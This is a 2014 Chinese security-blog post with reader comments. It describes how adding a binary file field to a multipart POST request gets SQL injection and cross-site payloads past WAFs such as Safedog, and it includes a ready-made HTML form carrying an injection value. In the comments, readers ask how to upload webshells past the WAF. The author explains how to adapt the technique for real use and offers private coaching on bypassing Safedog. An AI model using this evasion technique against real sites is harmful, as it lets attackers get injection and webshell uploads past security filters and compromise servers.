@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>轻松绕各种WAF的POST注入、跨站防御(比如安全狗) - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="园长" /><meta name="description" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)。XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。构建如下HTML表单：" />
+<meta name="keywords" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/4263/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)" />
+<meta property="og:description" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)。XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。构建如下HTML表单：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/4263/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2014-03-31T10:41:10&#43;08:00" />
+<meta property="article:modified_time" content="2014-03-31T11:08:49&#43;08:00" />
+
+<meta itemprop="name" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)">
+<meta itemprop="description" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)。XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。构建如下HTML表单："><meta itemprop="datePublished" content="2014-03-31T10:41:10&#43;08:00" />
+<meta itemprop="dateModified" content="2014-03-31T11:08:49&#43;08:00" />
+<meta itemprop="wordCount" content="2155">
+<meta itemprop="keywords" content="POS,WAF,安全,安全狗,狗,跨站,注入,Hack,Html,HTTP,IP,PHP,Putty,二进制,绕过,上传,猥琐,文件," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)"/>
+<meta name="twitter:description" content="轻松绕各种WAF的POST注入、跨站防御(比如安全狗)。XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。构建如下HTML表单："/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">轻松绕各种WAF的POST注入、跨站防御(比如安全狗)</h1>
+      
+      <div class="post-meta">
+        <time datetime="2014-03-31" class="post-time">
+          2014-03-31
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/pos/"> POS </a>
+            <a href="https://lcx.cc/categories/waf/"> WAF </a>
+            <a href="https://lcx.cc/categories/%E5%AE%89%E5%85%A8/"> 安全 </a>
+            <a href="https://lcx.cc/categories/%E5%AE%89%E5%85%A8%E7%8B%97/"> 安全狗 </a>
+            <a href="https://lcx.cc/categories/%E7%8B%97/"> 狗 </a>
+            <a href="https://lcx.cc/categories/%E8%B7%A8%E7%AB%99/"> 跨站 </a>
+            <a href="https://lcx.cc/categories/%E6%B3%A8%E5%85%A5/"> 注入 </a>
+            
+          </div>
+        <span class="more-meta"> 约 2155 字 </span>
+          <span class="more-meta"> 预计阅读 5 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。今天发现安全狗变聪明了以前那套他不吃了，不过随手给狗提交了一个二进制的文件域就XXOO了。注意一定要是二进制文件，图片、压缩包什么的都行。
+</p>
+<p style="text-indent:2em;">
+	构建如下HTML表单：
+</p>
+<pre class="prettyprint">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+&lt;title&gt;yzmm - p2j.cn&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action="http://192.168.199.151/index.php" method="POST" enctype="multipart/form-data"&gt;
+        File:&lt;input type="file" name="file" /&gt;&lt;br/&gt;
+        ID:&lt;input type="text" name="id" value="select 1 from mysql.user--" style="width:250px;" / &gt;&lt;br/&gt;
+         &lt;input type="submit" value="提交" /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	index.php:
+</p>
+<pre class="prettyprint">&lt;?php
+  echo "POST-ID:".$_POST['id']."&lt;br/&gt;GET-ID:".$_GET['id'];
+?&gt;</pre>
+<p style="text-indent:2em;">
+	提交如下请求：
+</p>
+<p style="text-indent:2em;">
+	<img title="提交如下请求" alt="提交如下请求" src="/file/old/4149_1.jpg" width="535" height="453" /> 
+</p>
+<p style="text-indent:2em;">
+	提交带二进制文件的请求：
+</p>
+<p style="text-indent:2em;">
+	<img title="提交带二进制文件的请求" alt="提交带二进制文件的请求" src="/file/old/4150_2.jpg" width="361" height="252" /> 
+</p>
+<p style="text-indent:2em;">
+	成功绕过。
+</p>
+<p>
+	<strong>相关讨论：</strong> 
+</p>
+<p style="text-indent:2em;">
+	1#
+</p>
+<p style="text-indent:2em;">
+	phith0n (www.leavesongs.com) | 2014-03-30 19:39
+</p>
+<p style="text-indent:2em;">
+	mark
+</p>
+<p style="text-indent:2em;">
+	2#
+</p>
+<p style="text-indent:2em;">
+	Blacker | 2014-03-30 19:43
+</p>
+<p style="text-indent:2em;">
+	这个好
+</p>
+<p style="text-indent:2em;">
+	3#
+</p>
+<p style="text-indent:2em;">
+	高斯 | 2014-03-30 19:50
+</p>
+<p style="text-indent:2em;">
+	mark 前排
+</p>
+<p style="text-indent:2em;">
+	4#
+</p>
+<p style="text-indent:2em;">
+	insight-labs (Root Yourself in Success) | 2014-03-30 19:55
+</p>
+<p style="text-indent:2em;">
+	赞一个
+</p>
+<p style="text-indent:2em;">
+	5#
+</p>
+<p style="text-indent:2em;">
+	西毒 | 2014-03-30 19:56
+</p>
+<p style="text-indent:2em;">
+	各种猥琐方式....
+</p>
+<p style="text-indent:2em;">
+	6#
+</p>
+<p style="text-indent:2em;">
+	Sunshie (博客求大牛友链http://phpinfo.me) | 2014-03-30 20:04
+</p>
+<p style="text-indent:2em;">
+	叼
+</p>
+<p style="text-indent:2em;">
+	7#
+</p>
+<p style="text-indent:2em;">
+	Reserved | 2014-03-30 20:07
+</p>
+<p style="text-indent:2em;">
+	mark
+</p>
+<p style="text-indent:2em;">
+	8#
+</p>
+<p style="text-indent:2em;">
+	Kuuki | 2014-03-30 20:30
+</p>
+<p style="text-indent:2em;">
+	挤一挤 前排围观下
+</p>
+<p style="text-indent:2em;">
+	9#
+</p>
+<p style="text-indent:2em;">
+	f0r | 2014-03-30 20:34
+</p>
+<p style="text-indent:2em;">
+	看来马上就要修复了
+</p>
+<p style="text-indent:2em;">
+	10#
+</p>
+<p style="text-indent:2em;">
+	x1aoh4i | 2014-03-30 21:10
+</p>
+<p style="text-indent:2em;">
+	这个叼 我记得之前注入还能绕过上传呢
+</p>
+<p style="text-indent:2em;">
+	上传绕过注入 注入绕过上传 例子好像之前见过
+</p>
+<p style="text-indent:2em;">
+	11#
+</p>
+<p style="text-indent:2em;">
+	adm1n (女神有三宝，干嘛、呵呵、去洗澡~) | 2014-03-30 21:23
+</p>
+<p style="text-indent:2em;">
+	顶
+</p>
+<p style="text-indent:2em;">
+	12#
+</p>
+<p style="text-indent:2em;">
+	HackBraid | 2014-03-30 21:37
+</p>
+<p style="text-indent:2em;">
+	@园长 为啥二进制文件就绕过了恁？
+</p>
+<p style="text-indent:2em;">
+	13#
+</p>
+<p style="text-indent:2em;">
+	小土豆 (加油ing~~) | 2014-03-30 21:50
+</p>
+<p style="text-indent:2em;">
+	我靠。牛逼。
+</p>
+<p style="text-indent:2em;">
+	14#
+</p>
+<p style="text-indent:2em;">
+	浪子老柒 | 2014-03-30 22:03
+</p>
+<p style="text-indent:2em;">
+	mark
+</p>
+<p style="text-indent:2em;">
+	15#
+</p>
+<p style="text-indent:2em;">
+	Sogili (.) 长短短 (.) | 2014-03-30 22:08
+</p>
+<p style="text-indent:2em;">
+	这个好。
+</p>
+<p style="text-indent:2em;">
+	16#
+</p>
+<p style="text-indent:2em;">
+	Mujj (Krypt VPS特价www.80host.com) | 2014-03-30 22:43
+</p>
+<p style="text-indent:2em;">
+	@HackBraid 2进制，你怎么检查，杀毒都是靠“文件名缘分”杀毒。
+</p>
+<p style="text-indent:2em;">
+	17#
+</p>
+<p style="text-indent:2em;">
+	0x12 (帽子掉了|多逛，少说话。|小学生) | 2014-03-30 23:22
+</p>
+<p style="text-indent:2em;">
+	1024
+</p>
+<p style="text-indent:2em;">
+	18#
+</p>
+<p style="text-indent:2em;">
+	Sct7p | 2014-03-30 23:46
+</p>
+<p style="text-indent:2em;">
+	牛
+</p>
+<p style="text-indent:2em;">
+	19#
+</p>
+<p style="text-indent:2em;">
+	李旭敏 ((҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉) | 2014-03-30 23:48
+</p>
+<p style="text-indent:2em;">
+	简单粗暴···
+</p>
+<p style="text-indent:2em;">
+	20#
+</p>
+<p style="text-indent:2em;">
+	ghy459 (深挖洞，广积shell。) | 2014-03-30 23:51
+</p>
+<p style="text-indent:2em;">
+	牛逼
+</p>
+<p style="text-indent:2em;">
+	21#
+</p>
+<p style="text-indent:2em;">
+	老笨蛋 | 2014-03-31 01:01
+</p>
+<p style="text-indent:2em;">
+	太粗暴了，我喜欢！
+</p>
+<p style="text-indent:2em;">
+	22#
+</p>
+<p style="text-indent:2em;">
+	Aring | 2014-03-31 08:04
+</p>
+<p style="text-indent:2em;">
+	瓦咔咔
+</p>
+<p style="text-indent:2em;">
+	23#
+</p>
+<p style="text-indent:2em;">
+	luwikes (土豆你个西红柿，番茄你个马铃薯～～～) | 2014-03-31 08:34
+</p>
+<p style="text-indent:2em;">
+	略叼
+</p>
+<p style="text-indent:2em;">
+	24#
+</p>
+<p style="text-indent:2em;">
+	x0ers (第一个知道牛奶能喝的人都对奶牛做了些什么？) | 2014-03-31 08:34
+</p>
+<p style="text-indent:2em;">
+	记录下，下班回来试。
+</p>
+<p style="text-indent:2em;">
+	25#
+</p>
+<p style="text-indent:2em;">
+	Mr.x | 2014-03-31 08:41
+</p>
+<p style="text-indent:2em;">
+	如果把ID放到file前面呢？
+</p>
+<p style="text-indent:2em;">
+	26#
+</p>
+<p style="text-indent:2em;">
+	国士无双 (我来找快乐。) | 2014-03-31 08:58
+</p>
+<p style="text-indent:2em;">
+	屌炸了
+</p>
+<p style="text-indent:2em;">
+	27#
+</p>
+<p style="text-indent:2em;">
+	乐乐、 (一如乌云深似海 从此马甲是路人) | 2014-03-31 09:14
+</p>
+<p style="text-indent:2em;">
+	好猥琐的说~
+</p>
+<p style="text-indent:2em;">
+	28#
+</p>
+<p style="text-indent:2em;">
+	lucky (一天一洞) | 2014-03-31 09:30
+</p>
+<p style="text-indent:2em;">
+	不错
+</p>
+<p style="text-indent:2em;">
+	29#
+</p>
+<p style="text-indent:2em;">
+	HackBraid | 2014-03-31 10:00
+</p>
+<p style="text-indent:2em;">
+	@Mujj 哦，但是最开始的那个请求也是被enctype="multipart/form-data"弄成二进制流提交的吧？
+</p>
+<p style="text-indent:2em;">
+	30#
+</p>
+<p style="text-indent:2em;">
+	炯炯虾 | 2014-03-31 10:33
+</p>
+<p style="text-indent:2em;">
+	WAF看是上传正常文件 当然不过滤了
+</p>
+<p style="text-indent:2em;">
+	31#
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/" target="_blank">核攻击</a> (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2014-03-31 10:33
+</p>
+<p style="text-indent:2em;">
+	好猥琐的绕法。。。
+</p>
+<p style="text-indent:2em;">
+	32#
+</p>
+<p style="text-indent:2em;">
+	秃鹫 | 2014-03-31 10:37
+</p>
+<p style="text-indent:2em;">
+	吊炸天啊
+</p>
+<p style="text-indent:2em;">
+	33#
+</p>
+<p style="text-indent:2em;">
+	newbie0086 | 2014-03-31 10:39
+</p>
+<p style="text-indent:2em;">
+	- - 这个公开了
+</p>
+<p style="text-indent:2em;">
+	34#
+</p>
+<p style="text-indent:2em;">
+	HackBraid | 2014-03-31 10:57
+</p>
+<p style="text-indent:2em;">
+	@炯炯虾 最开始的那个请求也是被enctype="multipart/form-data"弄成二进制流提交的吧？
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="6139,4263,218.189.42.191">
+<p>depycode @ 2014-04-01 10:28:20</p>
+<p style="text-indent:2em">广告位招租......  核总霸气外露！！！！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">赚点服务器钱……　-_-|||</p>
+</blockquote>
+<blockquote id="6140,4263,218.189.42.191">
+<p>depycode @ 2014-04-01 12:33:53</p>
+<p style="text-indent:2em">核总 高富帅啊   
+一个月多少万工资啊</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">≈0.1w</p>
+</blockquote>
+<blockquote id="6157,4263,112.64.10.225">
+<p>佚名 @ 2014-04-06 22:58:05</p>
+<p style="text-indent:2em">这个地方是怎么变成二进制的？
+是把大马用二进制转换器转成二进制吗？
+有这样的软件？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">呵呵，那叫二进制数据流，即文件原始数据，无需转换。</p>
+</blockquote>
+<blockquote id="6159,4263,112.64.10.225">
+<p>佚名 @ 2014-04-07 12:16:34</p>
+<p style="text-indent:2em">也就是说把index.asp用Base64换成二进制流，然后保存成图片格式，用跨平台直接上传还是被拦截啊
+博主能不能写下具体操作啊？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">已经说过了，无需转换！什么鸡毛“Base64换成二进制流，然后保存成图片格式，用跨平台直接上传”【狗血！】！风牛马不相及！！！
+目测你对http通讯数据方面知识为零，操作过程文中已有，建议你还是多了解点http通讯知识……</p>
+</blockquote>
+<blockquote id="6160,4263,112.64.10.225">
+<p>佚名 @ 2014-04-07 23:02:37</p>
+<p style="text-indent:2em">明白了，也就是说我直接保存那个HTML代码在本地，然后把小马用png格式保存，把上面的http://192.168.199.151/index.php这个地址改成那个网站可以上传的地址，把小马上传上去就可以了？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">可以这么说，不过并非什么“把小马用png格式保存”（晕，二进制数据和你用什么“格式”保存无关！你所做的只是改了个文件后缀而已……）“上传小马功能”，这里给出的 index.php 代码只是将上传的内容输出，做调试用。
+如果你实际使用，你还需要将代码改成执行或者写入文件之类的功能。</p>
+</blockquote>
+<blockquote id="6162,4263,116.226.40.32">
+<p>佚名 @ 2014-04-08 17:17:39</p>
+<p style="text-indent:2em">晕死，搞了这么久还是没懂，把小马改成图片，然后用传到了数据库，转成了二进制，然后在取出来保存问jpg格式，还是没成功。。。
+这个二进制到底怎么搞，快奔溃了。。。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">说过几次了，不是什么改格式！你这“把小马改成图片”，纯属徒劳行为！还传鸡毛数据库！“转成了二进制，然后在取出来保存问jpg格式”（对你这种“行为”无语了……），首先你自己根本就不知道什么叫做二进制！
+强烈、严重建议你恶补HTTP协议基础知识！然后找个文件上传页面抓下包，就全都明白了，不要再自己一个劲的用三脚猫功夫瞎捣鼓了……</p>
+</blockquote>
+<blockquote id="6165,4263,116.226.40.32">
+<p>佚名 @ 2014-04-09 12:44:27</p>
+<p style="text-indent:2em">哪些方法都是百度出来。。。博主，我交钱你教我吧，只学怎么过安全狗，其他的随便按照你心情教。
+或者你大发慈悲，把这个写的更具体点也行</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">哎，你还是加寡人QQ（root@lcx.cc）吧，这里聊天不方便。</p>
+</blockquote>
+<blockquote id="6172,4263,220.249.194.172">
+<p>佚名 @ 2014-04-09 21:48:54</p>
+<p style="text-indent:2em">本来select 1 from mysql.user--这个值传上去肯定是被拦截的，但是前面加了一个二进制文件，安全狗认为那个二进制文件是正常的，然后傻逼的也对后来的内容都通过了？如果，那估计还是会被拦截吧？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">嗯 你把 select 1 from mysql.user 放前面试一下就知道了呗……</p>
+</blockquote>
+<blockquote id="6227,4263,120.192.229.248">
+<p>Mike @ 2014-04-19 23:08:55</p>
+<p style="text-indent:2em">底下那个116.226.40.*咋是个神呢。。。（流汗）
+本人刚刚关注核总几天，表示很感兴趣 =.= 问一下核总有没有RSA公钥？（加密强迫症请勿见怪）</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">没有</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">园长</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2014-03-31
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/waf/">WAF</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8%E7%8B%97/">安全狗</a>
+          <a href="https://lcx.cc/tags/%E7%8B%97/">狗</a>
+          <a href="https://lcx.cc/tags/%E8%B7%A8%E7%AB%99/">跨站</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+          <a href="https://lcx.cc/tags/hack/">Hack</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/putty/">Putty</a>
+          <a href="https://lcx.cc/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+          <a href="https://lcx.cc/tags/%E7%BB%95%E8%BF%87/">绕过</a>
+          <a href="https://lcx.cc/tags/%E4%B8%8A%E4%BC%A0/">上传</a>
+          <a href="https://lcx.cc/tags/%E7%8C%A5%E7%90%90/">猥琐</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/4264/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">科普：网上流畅一个种说法，只要有身份证就能办信用卡？套取用户信息？</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/4262/">
+            <span class="next-text nav-default">论安卓手机抓包方案，手机应用抓包：哪个安卓虚拟机可以抓包的啊？</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
